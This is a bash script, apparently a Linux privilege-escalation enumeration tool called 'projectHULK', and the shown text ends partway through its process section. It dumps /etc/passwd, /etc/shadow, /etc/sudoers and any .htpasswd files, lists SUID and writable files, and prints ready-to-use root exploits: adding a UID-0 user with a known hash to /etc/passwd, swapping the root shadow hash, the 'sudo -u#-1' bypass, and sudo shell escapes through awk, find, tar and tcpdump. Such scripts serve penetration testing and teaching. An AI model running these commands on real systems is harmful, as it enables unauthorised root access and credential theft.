#!/bin/bash


#------------------> Banner:
    
    echo -e "\t\t\t╔════════════════════════════════════════════════════════════════════════════════════════════════╗"
    echo -e "\t\t\t║██████╗ ██████╗ █████╗       ██╗███████╗ █████╗ ████████╗      ██╗  ██╗██╗   ██╗██╗     ██╗  ██╗║"
    echo -e "\t\t\t║██╔══██╗██╔══██╗██╔══██╗     ██║██╔════╝██╔══██╗╚══██╔══╝      ██║  ██║██║   ██║██║     ██║ ██╔╝║"
    echo -e "\t\t\t║██████╔╝██████╔╝██║  ██║     ██║█████╗  ██║  ╚═╝   ██║         ███████║██║   ██║██║     █████═╝ ║"
    echo -e "\t\t\t║██╔═══╝ ██╔══██╗██║  ██║██╗  ██║██╔══╝  ██║  ██╗   ██║  █████  ██╔══██║██║   ██║██║     ██╔═██╗ ║"
    echo -e "\t\t\t║██║     ██║  ██║╚█████╔╝╚█████╔╝███████╗╚█████╔╝   ██║         ██║  ██║╚██████╔╝███████╗██║ ╚██╗║"
    echo -e "\t\t\t║╚═╝     ╚═╝  ╚═╝ ╚════╝  ╚════╝ ╚══════╝ ╚════╝    ╚═╝         ╚═╝  ╚═╝ ╚═════╝ ╚══════╝╚═╝  ╚═╝║"
    echo -e "\t\t\t╚═══════════════════════════════════════════════════════════════════{\033[1;31;40mThe Incredable Script v1.5\033[0m}═╝"
    sleep 1
    #------------------> Info:
    echo -e "\n\033[1;34;40mInfo:\033[0m"
    sleep 0.1
    echo -e "\tThis script has been designed to help security team (SOC) or to be used for educational purposes in finding system vulnerability"
    echo -e "\tthat may lead to privilege escatation & it should be used in safe environment. The author is not responsible for any misuse of it"
    sleep 0.1
    #------------------> Auth:
    echo -e "\n\033[1;34;40mAuther:\033[0m"
    sleep 0.1
    echo -e "\t     Iron Hulk"
    echo -e "\tMan In A Black Tuxedu"
    sleep 0.1
    #------------------> Accounts:
    echo -e "\n\033[1;34;40mContact:\033[0m"
    sleep 0.1
    echo -e "\tTweet Me: IronHulk_x69"
    sleep 0.1
    #------------------> Message:
    echo -e "\n\033[1;34;40mMessage:\033[0m"
    sleep 0.1
    echo -e "\tAll the POC's have been listed based on the author's opinion, you may use anything you which"
    echo -e "\trememebr, SKY HAS NO LIMITS :)"
    sleep 0.1
    #------------------> Recommendation:
    echo -e "\n\033[1;34;40mRecommendation:\033[0m"
    sleep 0.1
    echo -e "\tFor a better view of the report is it recomended to redirect the output to a file. ./projectHULK.sh | tee report.txt"
    sleep 0.1
    #------------------> Start time"
    echo -e "\n\033[1;34;40mScan Started At:\033[0m"
    sleep 0.1
    echo -e "\t"; date
    #------------------> Enumeration:
    echo -e "\n\n\033[1;31;40m\t\t\tEnumeration on progress #................................................................................. 1%\033[0m\n\n"
    sleep 5
#------------------> Password File Permission:
    echo -e "\n\033[1;31;40m [+]############################################################################################################################################[+]\033[0m"
    echo -e "\n\033[1;31;40m [+]------------------------------------------------------- [ Password File Permission ] -------------------------------------------------------[+]\033[0m"
    echo -e "\n\033[1;31;40m [+]############################################################################################################################################[+]\033[0m"
    sleep 1
    #------------------> what is Password File:
    echo -e "\n\033[1;34;40m[+] Each field is separated by a colon, and represents a different attribute to the user:\033[0m"
    echo -e "\t  ╔══════════════════════════════════════════════════════════════════════════════╗"
    echo -e "\t  ║<Username>:<Password>:<UserID>:<GroupID>:<GecosField>:<HomeDirectory>:<Shell> ║"
    echo -e "\t  ║If an -x- is representing the password field, this indicates that the password║"
    echo -e "\t  ║is encrypted.                                                                 ║"
    echo -e "\t  ╚══════════════════════════════════════════════════════════════════════════════╝"
    #------------------> Password File:
    echo -e "\n\033[1;34;40m[+] Password file:\033[0m"
    ls_passwd=`ls -la /etc/passwd`
    echo -e "$ls_passwd"
        echo -e "\t  ╔════════════════════════════════════════════════════════════════════════════════╗"
        echo -e "\t  ║If the file has write permission, it can be abused by adding a new user with    ║"
        echo -e "\t  ║root privilage to the file. If it's no't writable, then its protected.          ║"
        echo -e "\t  ║\033[1;31;40mPOC:\033[0m                                                                            ║"
        echo -e "\t  ║\033[1;31;40mFirst generate a password with one of the following commands:\033[0m                   ║"
        echo -e "\t  ║\033[1;31;40m    openssl passwd -1 -salt hulk password\033[0m                                       ║"
        echo -e '\t  ║\033[1;31;40m    perl -le ''print crypt("hulk", "password")\033[0m                                    ║'
        echo -e "\t  ║\033[1;31;40mRewrite the password file:\033[0m                                                      ║"
        echo -e '\t  ║\033[1;31;40m    echo "hulk:HASH:0:0::/root:/bin/bash" >> /etc/passwd"\033[0m                       ║'
        echo -e "\t  ║\033[1;31;40mThen do: su hulk\033[0m                                                                ║"
        echo -e "\t  ║Read more:                                                                      ║"
        echo -e "\t  ║https://www.hackingarticles.in/editing-etc-passwd-file-for-privilege-escalation/║"
        echo -e "\t  ║Protect the file by limiting the access to it:                                  ║"
        echo -e "\t  ║chmod 600 /etc/passwd                                                           ║"
        echo -e "\t  ╚════════════════════════════════════════════════════════════════════════════════╝"
    echo -e "\n\033[1;34;40m[+] Reading The Password File:\033[0m"
    read_passwd=`cat /etc/passwd`
    echo -e "$read_passwd"
   #------------------> Hash in Password File:
    echo -e "\n\033[1;34;40m[+] Hash in Password file:\033[0m"
    hash=`grep -v '^[^:]*:[x]' /etc/passwd`
    echo -e "$hash"
        echo -e "\t  ╔══════════════════════════════════════════════════════════════════════════════╗"
        echo -e "\t  ║If any hash is found in the /etc/passwd, the attacker my try to crack it by   ║"
        echo -e "\t  ║using any hash cracker software, tool or website.                             ║"
        echo -e "\t  ╚══════════════════════════════════════════════════════════════════════════════╝"
    #------------------> Shadow File:
    echo -e "\n\033[1;34;40m[+] Shadow file:\033[0m"
    ls_shadow=`ls -la /etc/shadow`
    echo -e "$ls_shadow"
        echo -e "\t  ╔═══════════════════════════════════════════════════════════════════════════════════╗"
        echo -e "\t  ║If the file has read/write permission, it can abused by replacing the root HASH    ║"
        echo -e "\t  ║with the attacker's HASH or the attacker my copy the hash & try to crack it.       ║"
        echo -e "\t  ║\033[1;31;40mPOC:\033[0m                                                                               ║"
        echo -e "\t  ║\033[1;31;40m1) Generate a new Shadow Hash and replace it with the\033[0m                              ║"
        echo -e "\t  ║\033[1;31;40m   current root hash:\033[0m                                                              ║"
        echo -e "\t  ║\033[1;31;40m    - mkpasswd  -m sha-512 -S prove123 -s\033[0m                                          ║"
        echo -e "\t  ║\033[1;31;40m2) Open the shadow file using any text edirot of your choice:\033[0m                      ║"
        echo -e "\t  ║\033[1;31;40m   or copy your HASH from your system and replace it with\033[0m                          ║"
        echo -e "\t  ║\033[1;31;40m   the root hash\033[0m                                                                   ║"
        echo -e "\t  ║\033[1;31;40m3) Login to root using your password\033[0m                                               ║"
        echo -e "\t  ║\033[1;31;40m4) Or Simply do:\033[0m                                                                   ║"
        echo -e '\t  ║\033[1;31;40mecho "privesc:Npge08pfz4wuk:0:0:privesc,,,:/:/bin/bash" >> /etc/passwd\033[0m             ║'
        echo -e "\t  ║\033[1;31;40mThis adds a root privilege user 'privesc' with the password 'password'\033[0m             ║"
        echo -e "\t  ║Read More:                                                                         ║"
        echo -e "\t  ║https://blog.geoda-security.com/2019/02/privilege-escalation-exploiting-write.html ║"
        echo -e "\t  ║Protect the file by limiting the access to it:                                     ║"
        echo -e "\t  ║chmod 600 /etc/shadow                                                              ║"
        echo -e "\t  ╚═══════════════════════════════════════════════════════════════════════════════════╝"
    echo -e "\n\033[1;34;40m[+] Reading The shadow File:\033[0m"
    read_shadow=`cat /etc/shadow`
    echo -e "$read_shadow"
    #------------------> Sudoers File:
    echo -e "\n\033[1;34;40m[+] Sudoers File:\033[0m"
    ls_sudo=`ls -la /etc/sudoers`
    echo -e "$ls_sudo"
        echo -e "\t  ╔═════════════════════════════════════════════════════════════════════════════════════════════════════╗"
        echo -e "\t  ║<Username> <All terminal>=<All user>:<All Group> <comand to execute>                                 ║"
        echo -e "\t  ║Read more:                                                                                           ║"
        echo -e "\t  ║https://medium.com/schkn/linux-privilege-escalation-using-text-editors-and-files-part-1-a8373396708d ║"
        echo -e "\t  ╚═════════════════════════════════════════════════════════════════════════════════════════════════════╝"
    echo -e "\n\033[1;34;40m[+] Reading The Sudoers File:\033[0m"
    read_sudo=`cat /etc/sudoers`
    echo -e "$read_sudo"
        echo -e "\t  ╔═════════════════════════════════════════════════════════════════════════════════════════════════════╗"
        echo -e "\t  ║The file shows a fully detailed about what the curent user my run as root. If the running file or the║"
        echo -e "\t  ║application has a globle vulnerability, the attacker may google it and abuse it for user escalation. ║"
        echo -e "\t  ║https://medium.com/schkn/linux-privilege-escalation-using-text-editors-and-files-part-1-a8373396708d ║"
        echo -e "\t  ╚═════════════════════════════════════════════════════════════════════════════════════════════════════╝"
    #------------------> User Group Lists:
    echo -e "\n\033[1;34;40m[+] User Group list:\033[0m"
    ls_group=`ls -la /etc/group`
    echo -e "$ls_group"
    echo -e "\n\033[1;34;40m[+] Content of User Group list:\033[0m"
    read_group=`cat /etc/group`
    echo -e "$read_group"
    #------------------> Password Policy:
    echo -e "\n\033[1;34;40m[+] Password Policy:\033[0m"
    policy= `grep "^PASS_MAX_DAYS\|^PASS_MIN_DAYS\|^PASS_WARN_AGE\|^ENCRYPT_METHOD" /etc/login.defs`
    echo -e "$policy"
    #------------------> Superusers:
    echo -e "\n\033[1;34;40m[+] Superuser:\033[0m"
    superusers=`awk -F: '($3 == '0') {print}' /etc/passwd`
    echo -e "$superusers"
    #------------------> List users with console:
    echo -e "\n\033[1;34;40m[+] List users with console:\033[0m"
    console=`cat /etc/passwd | grep "sh"`
    echo -e "$console"
    #------------------> Root Accounts:
    echo -e "\n\033[1;34;40m[+] Root Accounts:\033[0m"
    root_acc=`grep -v -E "^#" /etc/passwd 2>/dev/null| awk -F: '$3 == 0 { print $1}'`
    echo -e "$root_acc"
    #------------------> Sensitive files:
    echo -e "\n\033[1;34;40m[+] Sensitive files:\033[0m"
    sens_file=`ls -la /etc/passwd 2>/dev/null ; ls -la /etc/group 2>/dev/null ; ls -la /etc/profile 2>/dev/null; ls -la /etc/shadow 2>/dev/null ; ls -la /etc/master.passwd 2>/dev/null`
    echo -e "$sens_file"
    #------------------> htpasswd:
    echo -e "\n\033[1;34;40m[+] htpasswd:\033[0m"
    htpasswd=`find / -name .htpasswd -print -exec cat {} \; 2>/dev/null`
    echo -e "$htpasswd"
        echo -e "\t  ╔═════════════════════════════════════════════════════════════════════════════════════════════════════╗"
        echo -e "\t  ║Is a flat-file used to store usernames and password. This file is generally used by the web server   ║"
        echo -e "\t  ║software like Apache, Nginx, etc. in order to verify the users via HTTP basic authentication they are║"
        echo -e "\t  ║in ASCII text format. The hash mybe cracked using online tools or any cracking password tools.       ║"
        echo -e "\t  ╚═════════════════════════════════════════════════════════════════════════════════════════════════════╝"
    #------------------> Root History File:
    echo -e "\n\033[1;34;40m[+] Root History File:\033[0m"
    root_history=`ls -la /root/.*_history`
    echo -e "$root_history"
#------------------> System Information:
        echo -e "\n\033[1;31;40m [+]############################################################################################################################################[+]\033[0m"
    echo -e "\n\033[1;31;40m [+]---------------------------------------------------------- [ System Information ] ----------------------------------------------------------[+]\033[0m"
    echo -e "\n\033[1;31;40m [+]############################################################################################################################################[+]\033[0m"
    sleep 1
    #------------------> User may run sudo on:
    echo -e "\n\033[1;34;40m[+] User may run sudo on:\033[0m"
    run_as=`sudo -l 2>/dev/null`
    echo -e "$run_as"
    #------------------> Current user is:
    echo -e "\n\033[1;34;40m[+] Current user is:\033[0m"
    me=`whoami 2>/dev/null`
    echo -e "$me"
    #------------------> User ID:
    echo -e "\n\033[1;34;40m[+] User ID:\033[0m"
    user_id=`id 2>/dev/null`
    echo -e "$user_id"
        echo -e "\n\033[0;37;41mNote\033[0m"
        echo -e "\t  ╔══════════════════════════════════════════════════════════════════════════════╗"
        echo -e "\t  ║Some times, the user may be a part of vulnrable group such as: lxd/lxc, Docker║"
        echo -e "\t  ║Wheel, Shadow, Disk, Video. Every group worths Googling for exploit.          ║"
        echo -e "\t  ╚══════════════════════════════════════════════════════════════════════════════╝"
    #------------------> Are we in a docker container:
    echo -e "\n\033[1;34;40m[+] Are we in a docker:\033[0m"
    we_docker=`grep -i docker /proc/self/cgroup  2>/dev/null; find / -name "*dockerenv*" -exec ls -la {} \; 2>/dev/null`
    echo -e "$we_docker"
    echo -e "\n\033[0;37;41mEsc from Doker\033[0m"
        echo -e "\t  ╔══════════════════════════════════════════════════════════════════════════════╗"
        echo -e "\t  ║Read more about linux containers:                                             ║"
        echo -e "\t  ║https://linuxcontainers.org/                                                  ║"
        echo -e "\t  ║Esc Docker:-                                                                  ║"
        echo -e "\t  ║https://gtfobins.github.io/gtfobins/docker/                                   ║"
        echo -e "\t  ║https://www.hackingarticles.in/docker-privilege-escalation/                   ║"
        echo -e "\t  ╚══════════════════════════════════════════════════════════════════════════════╝"
    #------------------> Are we in a lxd/lxc container:
    echo -e "\n\033[1;34;40m[+] Are we in a lxd/lxc:\033[0m"
    lxd_lxc=`grep -qa container=lxc /proc/1/environ 2>/dev/null`
    echo -e "$lxd_lxc"
        echo -e "\n\033[0;37;41mEsc from lxd/lxc:\033[0m"
        echo -e "\t  ╔═════════════════════════════════════════════════════════════════════════════════════════════════════════════════╗"
        echo -e "\t  ║Read more about linux containers:                                                                                ║"
        echo -e "\t  ║https://linuxcontainers.org/                                                                                     ║"
        echo -e "\t  ║Esc LXD/LXC:-                                                                                                    ║"
        echo -e "\t  ║https://www.hackingarticles.in/lxd-privilege-escalation/                                                         ║"
        echo -e "\t  ║https://steflan-security.com/linux-privilege-escalation-exploiting-the-lxc-lxd-groups/                           ║"
        echo -e "\t  ║https://book.hacktricks.xyz/linux-unix/privilege-escalation/interesting-groups-linux-pe/lxd-privilege-escalation ║"
        echo -e "\t  ╚═════════════════════════════════════════════════════════════════════════════════════════════════════════════════╝"
    #------------------> System Name:
    echo -e "\n\033[1;34;40m[+] System Name:\033[0m"
    s_name=`uname -a 2>/dev/null`
    echo -e "$s_name"
    #------------------> System Release:
    echo -e "\n\033[1;34;40m[+] System Release:\033[0m"
    lsb=`lsb_release -a 2>/dev/null`
    echo -e "$lsb"
    #------------------> Host Name:
    echo -e "\n\033[1;34;40m[+] Host name:\033[0m"
    h_name=`hostname 2>/dev/null`
    echo -e "$h_name"
    #------------------>s System Version:
    echo -e "\n\033[1;34;40m[+] System Version:\033[0m"
    sys_ver=`cat /proc/version | uname -a 2>/dev/null`
    echo -e "$sys_ver"
    echo -e "\n\033[0;37;41mNote\033[0m"
        echo -e "\t  ╔══════════════════════════════════════════════════════════════════════════════╗"
        echo -e "\t  ║The version is not listed in our database. However make sure to keep your     ║"
        echo -e "\t  ║system always up-to-date. Old version are always vulnerab. Visit the link     ║"
        echo -e "\t  ║bellow for more details:                                                      ║"
        echo -e "\t  ║https://github.com/SecWiki/linux-kernel-exploits                              ║"
        echo -e "\t  ║Or use:                                                                       ║"
        echo -e '\t  ║searchsploit "Linux Kernel"                                                   ║'
        echo -e "\t  ╚══════════════════════════════════════════════════════════════════════════════╝"
        
        echo -e "\n\033[0;37;41mList of vulnerable kernel versions:\033[0m"
        echo -e "\t  ╔══════════════════════════════════════════════════════════════════════════════════════════════════════════╗"
        echo -e "\t  ║3.9.6 3.9.0 3.9 3.8.9 3.8.8 3.8.7 3.8.6 3.8.5 3.8.4 3.8.3 3.8.2 3.8.1 3.8.0 3.8 3.7.6 3.7.0 3.7 3.6.0 3.6 ║"
        echo -e "\t  ║3.5.0 3.5 3.4.9 3.4.8 3.4.6 3.4.5 3.4.4 3.4.3 3.4.2 3.4.1 3.4.0 3.4 3.3 3.2 3.19.0 3.16.0 3.15 3.14 3.13.1║"
        echo -e "\t  ║3.13.0 3.13 3.12.0 3.12 3.11.0 3.11 3.10.6 3.10.0 3.10 3.1.0 3.0.6 3.0.5 3.0.4 3.0.3 3.0.2 3.0.1 3.0.0    ║"
        echo -e "\t  ║2.6.9 2.6.8 2.6.7 2.6.6 2.6.5 2.6.4 2.6.39 2.6.38 2.6.37 2.6.36 2.6.35 2.6.34 2.6.33 2.6.32 2.6.31 2.6.30 ║"
        echo -e "\t  ║2.6.3 2.6.29 2.6.28 2.6.27 2.6.26 2.6.25 2.6.24.1 2.6.24 2.6.23 2.6.22 2.6.21 2.6.20 2.6.2 2.6.19 2.6.18  ║"
        echo -e "\t  ║2.6.17 2.6.16 2.6.15 2.6.14 2.6.13 2.6.12 2.6.11 2.6.10 2.6.1 2.6.0 2.4.9 2.4.8 2.4.7 2.4.6 2.4.5 2.4.4   ║"
        echo -e "\t  ║2.4.37 2.4.36 2.4.35 2.4.34 2.4.33 2.4.32 2.4.31 2.4.30 2.4.29 2.4.28 2.4.27 2.4.26 2.4.25 2.4.24 2.4.23  ║"
        echo -e "\t  ║2.4.22 2.4.21 2.4.20 2.4.19 2.4.18 2.4.17 2.4.16 2.4.15 2.4.14 2.4.13 2.4.12 2.4.11 2.4.10 2.2.24         ║"
        echo -e "\t  ╚══════════════════════════════════════════════════════════════════════════════════════════════════════════╝"
    #------------------> Sudo Version:
    echo -e "\n\033[1;34;40m[+] Sudo Version:\033[0m"
    su_ver=`sudo -V | grep "Sudo ver" 2>/dev/null`
    echo -e "$su_ver"
    echo -e "\n\033[0;37;41mNote\033[0m"
        echo -e "\t  ╔══════════════════════════════════════════════════════════════════════════════╗"
        echo -e "\t  ║The version is not listed in our database. However make sure to keep your     ║"
        echo -e "\t  ║system always up-to-date. Old version are vulnerab. Use google for more       ║"
        echo -e "\t  ║details or use:                                                               ║"
        echo -e '\t  ║searchsploit "sudo"                                                           ║'
        echo -e "\t  ╚══════════════════════════════════════════════════════════════════════════════╝"
    #------------------> Is sudo version vulnerable:
    echo -e "\n\033[1;34;40m[+] Is sudo version vulnerable?\033[0m"
    su_vul=`sudo -V | grep "Sudo ver" | grep "1\.[01234567]\.[0-9]\+\|1\.8\.1[0-9]\*\|1\.8\.2[01234567]"`
    echo -e "$su_vul"
    echo -e "\n\033[0;37;41mNote\033[0m"
        echo -e "\t  ╔══════════════════════════════════════════════════════════════════════════════╗"
        echo -e "\t  ║If the sudo version <= v1.28, it is exploitable                               ║"
        echo -e "\t  ║\033[1;31;40mPOC:\033[0m                                                                          ║"
        echo -e "\t  ║\033[1;31;40msudo -u#-1 /bin/bash\033[0m                                                          ║"
        echo -e "\t  ╚══════════════════════════════════════════════════════════════════════════════╝"
        #------------------> Who is logged on:
    echo -e "\n\033[1;34;40m[+] Who's logged in:\033[0m"
    w=`w`
    echo -e "$w"
    #------------------> Path Environment:
    echo -e "\n\033[1;34;40m[+] Path Environment:\033[0m"
    path_env=`systemctl show-environment 2>/dev/null`
    echo -e "$path_env"
    echo -e "\n\033[1;34;40m[+] Path :\033[0m"
    path_path=`echo $PATH`
    echo -e "$path_path"
    echo -e "\n\033[0;37;41mNote\033[0m"
        echo -e "\t  ╔══════════════════════════════════════════════════════════════════════════════════════════════╗"
        echo -e "\t  ║If you have write permissions on any folder inside the PATH variable you may be able to hijack║"
        echo -e "\t  ║some libraries or binaries. Read more:                                                        ║"
        echo -e "\t  ║https://resources.infosecinstitute.com/topic/vulnhub-machines-walkthrough-series-pwnlab-init/ ║"
        echo -e "\t  ╚══════════════════════════════════════════════════════════════════════════════════════════════╝"
    #------------------> Enumeration:
    echo -e "\n\n\033[1;31;40m\t\t\tEnumeration on progress ###################............................................................... 20%\033[0m\n\n"
    sleep 5
#------------------> System Date/Time:
        echo -e "\n\033[1;31;40m [+]############################################################################################################################################[+]\033[0m"
    echo -e "\n\033[1;31;40m [+]----------------------------------------------------------- [ System Date/Time ] -----------------------------------------------------------[+]\033[0m"
    echo -e "\n\033[1;31;40m [+]############################################################################################################################################[+]\033[0m"
    sleep 1
    #------------------> System Up Time:
    echo -e "\n\033[1;34;40m[+] Up Time:\033[0m"
    #------------------> System Date:
    echo -e "\n\033[1;34;40m[+] System Date:\033[0m"
    s_date=`date 2>/dev/null`
    echo -e "$s_date"
    #------------------> CPU Information:
    echo -e "\n\033[1;34;40m[+] CPU Information:\033[0m"
    cpu_info=`lscpu 2>/dev/null`
    echo -e "$cpu_info"
    #------------------> System Timer:
    echo -e "\n\033[1;34;40m[+] System Timer List\033[0m"
    sys_timer=`systemctl list-timers --all 2>/dev/null`
    echo -e "$sys_timer"
#------------------> System SUID:
    
    echo -e "\n\033[1;31;40m [+]############################################################################################################################################[+]\033[0m"
    echo -e "\n\033[1;31;40m [+]------------------------------------------------------------- [ System SUID ] --------------------------------------------------------------[+]\033[0m"
    echo -e "\n\033[1;31;40m [+]############################################################################################################################################[+]\033[0m"
    sleep 1
    #------------------> What is SUID/GUID:
    echo -e "\n\033[1;34;40m[+] What is SUID/GUID?\033[0m"
        echo -e "\t  ╔══════════════════════════════════════════════════════════════════════════════╗"
        echo -e "\t  ║SUID (Set User ID) and SGIDs (Set Group ID) executables are those that execute║"
        echo -e "\t  ║with the permission of the owner (SUID) or group (SGID). You can identify SUID║"
        echo -e "\t  ║and SGIDs by a representative 's' in the execute permission field the file:   ║"
        echo -e "\t  ║-rwsr-sr-x can often be exploited to gain root privilege.                     ║"
        echo -e "\t  ╚══════════════════════════════════════════════════════════════════════════════╝"
    #------------------> Find capability:
    echo -e "\n\033[1;34;40m[+] Find capability files:\033[0m"
    capa=`getcap -r / 2>/dev/null`
    echo -e "$capa"
    echo -e "\n\033[0;37;41mNote\033[0m"
        echo -e "\t  ╔══════════════════════════════════════════════════════════════════════════════╗"
        echo -e "\t  ║Capabitity files are diffrent from system to another system. Googling them my ║"
        echo -e "\t  ║revile  a way of how to exploit them.                                         ║"
        echo -e "\t  ╚══════════════════════════════════════════════════════════════════════════════╝"
    #------------------> Built-in Binaries:
    echo -e "\n\033[1;34;40m[+] Built-in Binaries:\033[0m"
    echo -e "\n\033[0;37;41mNote\033[0m"
        echo -e "\t  ╔══════════════════════════════════════════════════════════════════════════════╗"
        echo -e "\t  ║Most linux system have these Binaries and they are builtin, no escalation is  ║"
        echo -e "\t  ║done by them unless file permission has been change.                          ║"
        echo -e "\t  ╚══════════════════════════════════════════════════════════════════════════════╝"
            echo -e "\t  /usr/sbin/pppd"
            echo -e "\t  /usr/sbin/exim4"
            echo -e "\t  /usr/bin/ntfs-3g"
            echo -e "\t  /usr/bin/chsh"
            echo -e "\t  /usr/bin/su"
            echo -e "\t  /usr/bin/chfn"
            echo -e "\t  /usr/bin/mount"
            echo -e "\t  /usr/bin/sudo"
            echo -e "\t  /usr/bin/umount"
            echo -e "\t  /usr/bin/pkexec"
            echo -e "\t  /usr/bin/passwd"
            echo -e "\t  /usr/bin/newgrp"
            echo -e "\t  /usr/bin/gpasswd"
            echo -e "\t  /usr/bin/fusermount"
            echo -e "\t  /usr/sbin/mount.nfs"
            echo -e "\t  /usr/sbin/mount.cifs"
            echo -e "\t  /usr/lib/xorg/Xorg.wrap"
            echo -e "\t  /usr/lib/openssh/ssh-keysign"
            echo -e "\t  /usr/lib/chromium/chrome-sandbox"
            echo -e "\t  /usr/libexec/polkit-agent-helper-1"
            echo -e "\t  /usr/bin/vmware-user-suid-wrapper"
            echo -e "\t  /usr/lib/dbus-1.0/dbus-daemon-launch-helper"
    #------------------> Finding System SUID:
    echo -e "\n\033[1;34;40m[+] Finding System SUID:\033[0m"
    sys_suid=`find / -perm -u=s 2>/dev/null | xargs ls -la`
    echo -e "$sys_suid"
        echo -e "\n\033[0;37;41mNote\033[0m"
        echo -e "\t  ╔══════════════════════════════════════════════════════════════════════════════╗"
        echo -e "\t  ║Compare the output with the builtin binaries & goolge them for any exploit.   ║"
        echo -e "\t  ║Visite:                                                                       ║"
        echo -e "\t  ║https://gtfobins.github.io/                                                   ║"
        echo -e "\t  ║https://mil0.io/linux-privesc/                                                ║"
        echo -e "\t  ╚══════════════════════════════════════════════════════════════════════════════╝"
    #------------------> Finding System GUID:
    echo -e "\n\033[1;34;40m[+] Finding System GUID:\033[0m"
    sys_guid=`find / -perm -g=s -type f 2>/dev/null | xargs ls -l`
    echo -e "$sys_guid"
        echo -e "\t  ╔══════════════════════════════════════════════════════════════════════════════╗"
        echo -e "\t  ║Visite:                                                                       ║"
        echo -e "\t  ║https://gtfobins.github.io/                                                   ║"
        echo -e "\t  ║https://mil0.io/linux-privesc/                                                ║"
        echo -e "\t  ╚══════════════════════════════════════════════════════════════════════════════╝"
    #------------------> Execute as the owner:
    echo -e "\n\033[1;34;40m[+] Find Binaries that will execute as the owner:\033[0m"
    ex_owner=`find / -perm -u=s -type f 2>/dev/null | xargs ls -l`
    echo -e "$ex_owner"
    #------------------> Execute as the group:
    echo -e "\n\033[1;34;40m[+] Find binaries that will execute as the group:\033[0m"
    ex_group=`find / -perm -g=s -type f 2>/dev/null | xargs ls -l`
    echo -e "$ex_group"
    #------------------> Sticky-bit binaries:
    echo -e "\n\033[1;34;40m[+] Find sticky-bit binaries:\033[0m"
    st_bit=`find / -perm -1000 -type d 2>/dev/null | xargs ls -l && find / -perm -4000 2>/dev/null | xargs ls -l`
    echo -e "$st_bit"
    #------------------> World writable scripts invoked as root:
    echo -e "\n\033[1;34;40m[+] World writable scripts invoked as root:\033[0m"
    echo -e "Run this command manually: find / -writable -type f 2>/dev/null | xargs ls -l"
    echo -e "\n\033[0;37;41mNote\033[0m"
        echo -e "\t  ╔══════════════════════════════════════════════════════════════════════════════╗"
        echo -e "\t  ║If you find a script that is owned by root but is writable by anyone you can  ║"
        echo -e "\t  ║add your own malicious code into it and it will escalate your privileges when ║"
        echo -e "\t  ║the script runs as root                                                       ║"
        echo -e "\t  ╚══════════════════════════════════════════════════════════════════════════════╝"
    #------------------> World writeable directories:
    echo -e "\n\033[1;34;40m[+] World writeable directories:\033[0m"
    wr_dir=`find / -perm -2 -type d 2>/dev/null | xargs ls -l && find / -type d -perm -g+w -or -perm -o+w 2>/dev/null | xargs ls -l && find / -type d -perm -g+w 2>/dev/null | xargs ls -l && find / -type d -perm -o+w 2>/dev/null | xargs ls -l`
    echo -e "$wr_dir"
    #------------------> Writeable config files:
    echo -e "\n\033[1;34;40m[+] Writeable config files:\033[0m"
    wr_conf=`find /etc/ -writable -type f 2>/dev/null | xargs ls -la`
    echo -e "$wr_conf"
    #------------------> How Files Can Be Uploaded:
    echo -e "\n\033[1;34;40m[+] How Files Can Be Uploaded:\033[0m"
        echo -e `which wget | xargs ls -l`
        echo -e `which nc | xargs ls -l`
        echo -e `which netcat | xargs ls -l`
        echo -e `which socat | xargs ls -l`
        echo -e `which python | xargs ls -l`
        echo -e `which python3 | xargs ls -l`
        echo -e `which ftp | xargs ls -l`
        echo -e `which tftp | xargs ls -l`
        echo -e `which ssh | xargs ls -l`
        echo -e "\n\033[0;37;41mNote\033[0m"
        echo -e "\t  ╔══════════════════════════════════════════════════════════════════════════════╗"
        echo -e "\t  ║Some of them my have file misconfiguration and my lead to user escalation.    ║"
        echo -e "\t  ║File Transfer Cheatsheet: Windows and Linux                                   ║"
        echo -e "\t  ║https://www.hackingarticles.in/file-transfer-cheatsheet-windows-and-linux/    ║"
        echo -e "\t  ╚══════════════════════════════════════════════════════════════════════════════╝"
    #------------------> Writeable config files:
     echo -e "\n\033[1;34;40m[+] Unexpected commands allows you to read and/or write files or even execute command:\033[0m"
        echo -e "\t  ╔══════════════════════════════════════════════════════════════════════════════╗"
        echo -e '\t  ║sudo awk "BEGIN {system("/bin/sh")}"                                          ║'
        echo -e "\t  ║sudo find /etc -exec sh -i \;                                                 ║"
        echo -e "\t  ║sudo tcpdump -n -i lo -G1 -w /dev/null -z ./runme.sh                          ║"
        echo -e "\t  ║sudo tar c a.tar -I ./runme.sh a                                              ║"
        echo -e "\t  ║ftp>!/bin/sh                                                                  ║"
        echo -e "\t  ║less>! <shell_comand>                                                         ║"
        echo -e "\t  ╚══════════════════════════════════════════════════════════════════════════════╝"
    #------------------> Profiles files:
        echo -e "\n\033[1;34;40m[+] Profiles files\033[0m"
    profile=`ls -l /etc/profile /etc/profile.d/`
    echo -e "$profile"
        echo -e "\n\033[0;37;41mNote\033[0m"
        echo -e "\t  ╔══════════════════════════════════════════════════════════════════════════════╗"
        echo -e "\t  ║The file /etc/profile and the files under /etc/profile.d/ are scripts that are║"
        echo -e "\t  ║executed when a user run a new shell. Therefore, if you can write or modify   ║"
        echo -e "\t  ║any of the files, you can escalate your privilege.                            ║"
        echo -e "\t  ╚══════════════════════════════════════════════════════════════════════════════╝"
    #------------------> Is the .bashrc file writeable?:
        echo -e "\n\033[1;34;40m[+] Is the .bashrc file writeable?\033[0m"
    profile=`ls -la /home/*/.bashrc; locate .bashrc | xargs ls -la; find / -name .bashrc -xdev 2>/dev/null | xargs ls -la`
    echo -e "$profile"
        echo -e "\n\033[0;37;41mNote\033[0m"
        echo -e "\t  ╔══════════════════════════════════════════════════════════════════════════════╗"
        echo -e "\t  ║If so, malicious commands can be written to it and will be executed when the  ║"
        echo -e "\t  ║user/root logs in.                                                            ║"
        echo -e "\t  ╚══════════════════════════════════════════════════════════════════════════════╝"
    #------------------> Enumeration:
    echo -e "\n\n\033[1;31;40m\t\t\tEnumeration on progress #############################################..................................... 50%\033[0m\n\n"
    sleep 5
#------------------> System Process:
    echo -e "\n\033[1;31;40m [+]############################################################################################################################################[+]\033[0m"
    echo -e "\n\033[1;31;40m [+]------------------------------------------------------------ [ System Process ] ------------------------------------------------------------[+]\033[0m"
    echo -e "\n\033[1;31;40m [+]############################################################################################################################################[+]\033[0m"
    sleep 1
    #------------------> Note:
    echo -e "\n\033[0;37;41mNote\033[0m"
        echo -e "\t  ╔══════════════════════════════════════════════════════════════════════════════╗"
        echo -e "\t  ║Take a look to what processes are being executed and check if any process has ║"
        echo -e "\t  ║more privileges than it should. You can also use a tool called psyp.          ║"
        echo -e "\t  ║https://github.com/DominicBreuker/pspy                                        ║"
